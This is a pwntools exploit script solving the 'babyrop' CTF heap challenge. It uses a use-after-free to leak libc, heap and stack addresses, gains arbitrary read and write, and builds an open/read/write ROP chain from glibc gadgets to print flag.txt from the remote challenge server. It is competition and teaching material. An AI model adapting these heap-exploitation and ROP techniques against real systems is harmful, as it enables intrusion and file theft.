#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babyrop_patched
from pwn import *

# Set up pwntools for the correct architecture
if args.ORIG or args.REMOTE:
    exe = context.binary = ELF('babyrop')
    libc = ELF('./libc_orig.so')
else:
    exe = context.binary = ELF('babyrop_patched')
    libc = ELF('./libc-2.34.so')
HOST, PORT = "mc.ax 31245".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)

    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fe000)
# RUNPATH:  b'.'

def menu(command: str, idx: int) -> None:
    io.sendlineafter(b"enter your command: ", command.encode())
    io.sendlineafter(b"enter your index: ", str(idx).encode())

def create(idx: int, length: int, safe_string: bytes) -> None:
    menu("C", idx)
    io.sendlineafter(b"How long is your safe_string: ", str(length).encode())
    io.sendafter(b"enter your string: ", safe_string)

def free(idx: int) -> None:
    menu("F", idx)

def read_note(idx: int) -> bytes:
    menu("R", idx)
    res = io.recvline()
    return io.recvline()

def write_note(idx: int, safe_string: bytes) -> None:
    menu("W", idx)
    io.sendafter(b"enter your string: ", safe_string)

def unpack_note(data: bytes) -> int:
    return int(b"".join(data.split()[::-1]), 16)

def arb_write(data: bytes, address: int, length: int = 0x8) -> None:
    write_note(1, p64(length)+p64(address))
    write_note(0, data)

def arb_read(address: int, length: int = 0x8) -> bytes:
    write_note(1, p64(length)+p64(address))
    return read_note(0)

def search_return_address(stack_leak: int) -> int:
    egg = libc.address + 0x2d1ca
    if not args.REMOTE and not args.ORIG:
        egg = libc.sym["__libc_start_call_main"]+0x6d
    log.info(f"Looking for {hex(egg)}")
    temp_ret_addr = stack_leak
    while True:
        leak = unpack_note(arb_read(temp_ret_addr))
        if leak == egg:
            return temp_ret_addr
        temp_ret_addr += 0x8

    return 0

io = start()

CHUNK_SIZE = 0x70

log.info("0x0: leak libc")
create(2, CHUNK_SIZE, b"A")
create(0, CHUNK_SIZE, b"\x00")
free(0)
free(2)
create(1, 0x10, p64(0)+p64(0))
write_note(1, p64(0x8)+p64(exe.got.printf))
libc.address = unpack_note(read_note(0)) - libc.sym.printf
log.success(f"libc @ {hex(libc.address)}")

log.info("0x1: leak heap")
write_note(1, p64(0)+p64(0))
free(0)
create(0, CHUNK_SIZE, b"A")
heap_base_offset = 0x1be0
heap_leak = unpack_note(read_note(1)[8*3+1:])
log.info(f"got heap leak: {hex(heap_leak)}")
heap_base = heap_leak - heap_base_offset
log.success(f"heap @ {hex(heap_base)}")

log.info("0x2: leak stack")
stack_offset = 0x140
stack_leak = unpack_note(arb_read(libc.sym["environ"]))
stack_leak = stack_leak - stack_offset
log.info(f"stack leak: {hex(stack_leak)}")

log.info("0x3: find return address")
return_address = search_return_address(stack_leak)
log.info(f"return address @ {hex(return_address)}")

log.info("0x4: ROP")
_rop = lambda _: _+libc.address

def generate_rop(chain: list) -> bytes:
    return b"".join(
        p64(_) for _ in chain
    )

if args.REMOTE or args.ORIG:
    syscall     = _rop(0x888f2)     # syscall; ret;
    pop_rax     = _rop(0x448a8)     # pop rax; ret;
    pop_rdi     = _rop(0x2d7dd)     # pop rdi; ret;
    pop_rsi     = _rop(0x2eef9)     # pop rsi; ret;
    pop_rdx     = _rop(0xd9c2d)     # pop rdx; ret;
    pop_rcx     = _rop(0xf37ea)     # pop rcx; pop rbx; ret;
    mov_rdi_rax = _rop(0x565ce)     # mov rdi, rax; cmp rdx, rcx; jae 0x565b8; mov rax, r8; ret;
else:
    syscall     = _rop(0x88406)     # syscall; ret;
    pop_rax     = _rop(0x44710)     # pop rax; ret;
    pop_rdi     = _rop(0x2daa2)     # pop rdi; ret;
    pop_rsi     = _rop(0x37bca)     # pop rsi; ret;
    pop_rdx     = _rop(0xde622)     # pop rdx; ret;
    pop_rcx     = _rop(0xf30de)     # pop rcx; pop rbx; ret;
    mov_rdi_rax = _rop(0x566b2)     # mov rdi, rax; cmp rdx, rcx; jae 0x565b8; mov rax, r8; ret;

arb_write(b"flag.txt", heap_leak)

chain = [
    pop_rdi, heap_leak,
    pop_rsi, 0x0,
    pop_rdx, 0x7,
    pop_rax, 0x2,
    syscall,
    pop_rcx, 0xdeadbeef, 0xdeadbeef,
    pop_rdx, 0x0,
    mov_rdi_rax,
    pop_rsi, heap_leak,
    pop_rdx, 0x60,
    pop_rax, 0x0,
    syscall,
    pop_rdi, 1,
    pop_rsi, heap_leak,
    pop_rdx, 0x60,
    pop_rax, 0x1,
    syscall
]
payload = generate_rop(chain)
arb_write(payload, return_address, len(payload))

menu("E", 0)

flag = io.recvall(timeout=2).decode().replace("\x00", "")
log.success(f"got flag: {flag}")

# [+] got flag: dice{glibc_2.34_stole_my_function_pointers-but_at_least_nobody_uses_intel_CET}

